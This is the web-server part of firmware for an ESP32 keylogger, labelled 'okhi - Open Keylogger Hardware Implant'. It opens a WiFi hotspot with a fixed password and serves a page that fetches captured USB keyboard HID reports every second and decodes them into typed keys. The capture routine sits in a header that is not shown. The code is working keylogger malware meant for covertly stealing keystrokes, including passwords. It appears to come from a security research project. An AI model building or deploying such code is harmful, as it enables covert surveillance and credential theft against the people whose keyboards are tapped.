#include <stdio.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "esp_log.h"
#include "driver/spi_slave.h"
#include "driver/gpio.h"

#include <WiFi.h>
#include <WebServer.h>
#include <SPI.h>
#include "poc.h"

// Configuración del WiFi
const char* ssid = "ESP";
const char* password = "0123456789";

// Configuración del servidor web
WebServer server(80);



void handleRoot() {
  String html = "<!DOCTYPE html><html><head><title>okhi - Open Keylogger Hardware Implant</title>"
                "<style>"
                "body { font-family: Arial, sans-serif; background-color: #e0e0e0; color: #333; margin: 0; padding: 20px; }"
                "h1, h2 { color: #333; text-align: center; }"
                "h2 a { color: #007BFF; text-decoration: none; }"
                "h2 a:hover { text-decoration: underline; }"
                "textarea { width: 100%; margin: 10px 0; padding: 10px; border: 1px solid #ccc; border-radius: 4px; }"
                "label { font-weight: bold; }"
                "form { margin-bottom: 20px; }"
                ".container { max-width: 800px; margin: 0 auto; background: #fff; padding: 20px; box-shadow: 0 0 20px rgba(0, 0, 0, 0.1); border-radius: 8px; }"
                ".header { text-align: center; margin-bottom: 20px; }"
                "</style>"
                "<script>"
                "function fetchBuffer() {"
                "  console.log('Fetching buffer');"
                "  fetch('/buffer').then(response => response.text()).then(data => {"
                "    console.log('Buffer data:', data);"
                "    document.getElementById('bufferData').value = data;"
                "    document.getElementById('hexData').value = parseKeyboardHID(data);"
                "  }).catch(error => {"
                "    console.error('Error fetching buffer:', error);"
                "  });"
                "}"
                "function parseKeyboardHID(data) {"
                "  console.log('Parsing buffer data');"
                "  var lines = data.split(';');"
                "  var output = '';"
                "  for (var line of lines) {"
                "    var parts = line.trim().split(' ');"
                "    console.log('Line parts:', parts);"
                "    if (parts.length > 1) {"
                "      var mod = parseInt(parts[1], 16);"
                "      if (mod & 0x01) {"
                "        output += '[CTRL]';"
                "      }"
                 "      if (mod & 0x10) {"
                "        output += '[RCTRL]';"
                "      }"
                "      if (mod & 0x02) {"
                "        output += '[SHIFT]';"
                "      }"
                "      if (mod & 0x04) {"
                "        output += '[ALT]';"
                "      }"
                "      if (mod & 0x40) {"
                "        output += '[ALTGR]';"
                "      }"
                "      if (parts.length > 4) {"
                "        var keycodeHex = parts[4];"
                "        console.log('Processing keycode:', keycodeHex);"
                "        var keycode = parseInt(keycodeHex, 16);"
                "        if (keycode !== 0) {"
                "          var char = keycodeToChar(keycode);"
                "          console.log('Keycode to char:', keycode, '->', char);"
                "          if (char) output += char;"
                "        }"
                "      }"
                "    }"
                "  }"
                "  console.log('Parsed output:', output);"
                "  return output.trim();"
                "}"
                "function keycodeToChar(keycode) {"
                "  var map = {4: 'a', 5: 'b', 6: 'c', 7: 'd', 8: 'e', 9: 'f', 10: 'g', "
                "             11: 'h', 12: 'i', 13: 'j', 14: 'k', 15: 'l', 16: 'm', 17: 'n', "
                "             18: 'o', 19: 'p', 20: 'q', 21: 'r', 22: 's', 23: 't', 24: 'u', "
                "             25: 'v', 26: 'w', 27: 'x', 28: 'y', 29: 'z', 30: '1', 31: '2', "
                "             32: '3', 33: '4', 34: '5', 35: '6', 36: '7', 37: '8', 38: '9', "
                "             39: '0', 40: '[ENTER]', 42: '[BACKSPACE]', 44: ' ', 57: '[CAPSLOCK]'};"
                "  console.log('Keycode to char:', keycode, '->', map[keycode]);"
                "  return map[keycode];"
                "}"
                "setInterval(fetchBuffer, 1000);"
                "</script>"
                "</head><body>"
                "<div class='container'>"
                "<div class='header'>"
                "<h1>okhi - Open Keylogger Hardware Implant by Dreg</h1>"
                "<h2><a href=\"https://www.rootkit.es/\">rootkit.es</a> - <a href=\"https://github.com/therealdreg/okhi/\">GitHub</a></h2>"
                "</div>"
                "<form>"
                "  <label for='bufferData'>HID REPORTS</label><br>"
                "  <textarea id='bufferData' rows='10' cols='50' readonly></textarea><br><br>"
                "</form>"
                "<form>"
                "  <label for='hexData'>KEYS</label><br>"
                "  <textarea id='hexData' rows='10' cols='50' readonly></textarea><br><br>"
                "</form>"
                "</div>"
                "</body></html>";
  server.send(200, "text/html", html);
}



void handleBuffer() {
  server.send(200, "text/plain", (char*) buffer);
}

void setup() {
  Serial.begin(74880);
  delay(500);

  xTaskCreate(spi_task, "spi_task", 4096, NULL, configMAX_PRIORITIES - 1, NULL);


  // Configuración del punto de acceso WiFi
  WiFi.softAP(ssid, password, 1, false, 4);

  // Mostrar la IP del ESP32
  IPAddress IP = WiFi.softAPIP();
  Serial.print("IP del punto de acceso: ");
  Serial.println(IP);

  // Configurar manejadores para las rutas del servidor
  server.on("/", handleRoot);
  server.on("/buffer", handleBuffer);
  server.begin();
  Serial.println("Servidor HTTP iniciado");  
}

void loop() {
  server.handleClient();
}
